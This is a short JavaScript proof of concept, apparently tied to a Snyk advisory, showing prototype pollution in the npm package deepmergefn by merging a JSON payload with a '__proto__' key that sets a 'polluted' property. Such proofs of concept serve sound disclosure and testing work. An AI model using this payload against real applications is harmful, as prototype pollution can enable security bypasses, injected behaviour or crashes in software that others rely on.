//https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
 
  const deepMerge = require("deepmergefn");

   

  EVIL_DATA = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  deepMerge({}, EVIL_DATA);
// End of file
